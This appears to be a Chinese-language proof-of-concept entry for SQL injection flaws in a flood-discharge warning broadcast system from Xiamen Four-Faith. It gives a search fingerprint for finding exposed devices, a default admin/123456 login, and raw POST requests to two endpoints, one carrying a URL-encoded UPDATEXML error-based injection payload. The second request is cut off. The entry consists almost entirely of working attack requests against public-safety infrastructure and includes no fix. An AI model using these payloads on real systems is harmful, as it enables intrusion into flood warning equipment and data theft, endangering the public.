# 厦门四信通信科技有限公司泄洪预警广播系统存在多处SQL注入漏洞

- **系统**：厦门四信通信科技有限公司泄洪预警广播系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-30177135"`
- **请求**：`POST /devicetask/listPage.do HTTP/1.1`

**请求体 / payload**
```
弱口令登录admin /123456
Host:
Cookie: JSESSIONID=CEA41A8467A05D4EDF5121393B7EDCA5
Priority: u=0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
devicecode=%25%27+OR+UPDATEXML%283975%2CCONCAT%280x2e%2C0x7176786a71%2C%28SELECT+%28ELT%283975%3D3975%2C1%29%29%29%2C0x716a706a71%29%2C3853%29+AND+%27fEDT%25%27%3D%27fEDT&idBundle=&rows=10&page=1
POST /userInfo/findUserInfo.do HTTP/1.1
Host:
Cookie: JSESSIONID=CEA41A8467A05D4EDF5121393B7EDCA5
Priority: u=0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
name=%25%…（脚本共 1178 字，完整版见原文）
```
- **预期**：200　|　—